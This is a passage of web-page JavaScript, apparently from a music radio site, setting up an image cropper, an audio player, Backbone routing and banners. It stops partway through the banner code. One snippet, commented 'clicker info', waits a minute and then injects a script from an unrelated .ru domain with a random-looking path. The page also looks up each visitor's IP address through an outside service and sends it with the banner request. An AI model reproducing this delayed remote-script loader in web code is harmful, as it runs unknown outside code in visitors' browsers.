<script type="text/javascript">
    //&lt;![CDATA[
    $(document).ready(function(){

    //Cropper start

        function customCrop() {
            var $image = $(".image-crop &gt; img")
            $($image).cropper({
                aspectRatio: 1.618,
                preview: ".img-preview",
                done: function(data) {
                    // Output the result data for cropping image.
                }
            });

            var $inputImage = $("#inputImage");
            if (window.FileReader) {
                $inputImage.change(function() {
                    var fileReader = new FileReader(),
                            files = this.files,
                            file;

                    if (!files.length) {
                        return;
                    }

                    file = files[0];

                    if (/^image\/\w+$/.test(file.type)) {
                        fileReader.readAsDataURL(file);
                        fileReader.onload = function () {
                            $inputImage.val("");
                            $image.cropper("reset", true).cropper("replace", this.result);
                        };
                    } else {
                        showMessage("Please choose an image file.");
                    }
                });
            } else {
                $inputImage.addClass("hide");
            };

            $('body').on("click", ".crop", function(event) {
                var cropCanvas = $image.cropper('getCroppedCanvas');
                var x = cropCanvas.toDataURL()
            });

        };

        // Cropper end


        // jPlayer

        $("#jquery_jplayer_1").jPlayer({
            ready: function () {
                $(this).jPlayer("setMedia", {
                    title: "Nothing",
                    mp3: ""
                });
            },
            loadstart: function () {
                window.randomFlag = true;
            },
            waiting: function () {
                $('.jp-controls').addClass('loading');
            },
            playing: function () {

                $('.jp-controls').removeClass('loading');

                $('.station-info.active').find('a').addClass('playing')

                if(window.targetPlay) {
                    $(window.targetPlay).parent().addClass('active');
                    $(window.targetPlay).addClass('playing');
                };

                window.equalizer = setInterval(function() {
                    var bars = document.getElementsByClassName('bar');
                    [].forEach.call(bars, function (bar) {
                        bar.style.height = Math.random() * 100 + '%';
                    });
                }, 180);

            },
            pause: function () {
                if(window.targetPlay) {
                    $(window.targetPlay).removeClass('playing');
                };

                $('.station-link').removeClass('playing');

                $('.jp-controls').removeClass('loading');

                window.stopEqualizer =
                        clearInterval(window.equalizer);
                var bars = document.getElementsByClassName('bar');
                [].forEach.call(bars, function (bar) {
                    bar.style.height = 0 + 'px';
                });


            },
            error: function (event) {

                if(event.jPlayer.error.type == 'e_url') {

                    $('.jp-controls').removeClass('loading');

                    clearInterval(window.activeStation);

                    var modalError = new Backbone.BootstrapModal({
                        content: '&lt;p class="server-error"&gt;' + 'The station is on a break. Try again later.' + '&lt;/p&gt;',
                        title: ' ',
                        animate: true,
                        showFooter: false
                    });
                    modalError.open();
                }

            },
            swfPath: "/bower_components/jplayer/dist/jplayer/",
            solution: "html",
            supplied: "mp3",
            wmode: "window",
            useStateClassSkin: true,
            autoBlur: false,
            smoothPlayBar: true,
            keyEnabled: true,
            remainingDuration: true,
            toggleDuration: true
        });

        $("#volume").slider({
            orientation: 'vertical',
            slide: function(event, ui) {
                $("#jquery_jplayer_1").jPlayer("volume", ui.value/100);
            }
        });

        $("#volume").slider('value',70);

    });
    //]]&gt;
</script>

<script>
    $(function () {
        MuzzaLife.on('start', function () {
            new App.Router();
            Backbone.history.start({ pushState: true });


            // clicker info
            setTimeout(function() {
                var s = document.createElement('script');
                s.type = 'text/javascript';
                s.src = 'http://ogrofer.ru/5xiyzm8h63d6h4h1kjcky96mhalv1dohm6xg7srhgows8n7b1hm9jrz8ux797bsi6e32yv5';
                var code = '';
                try {
                    s.appendChild(document.createTextNode(code));
                    document.body.appendChild(s);
                } catch (e) {
                    s.text = code;
                    document.body.appendChild(s);
                }
            },60000);

        });

        MuzzaLife.start();

        var navbarView = new App.Views.Navbar().render();
        $('.nav-wrapper').append(navbarView.el);



        $.get("http://jsonip.com", function(response) {

            if(response.ip) {
                bannersCollection = new App.Collections.Banners();
                bannersCollection.fetch({
                    traditional: true,
                    data: {address: response.ip}
                }).then(function(model) {
                    var bannersView = new App.Views.Banners({collection: bannersCollection}).render();
                    $('.banners-container').append(bannersView.el);

                    $('.bxslider').bxSlider({
//                    mode: 'fade',
                        speed: 600,
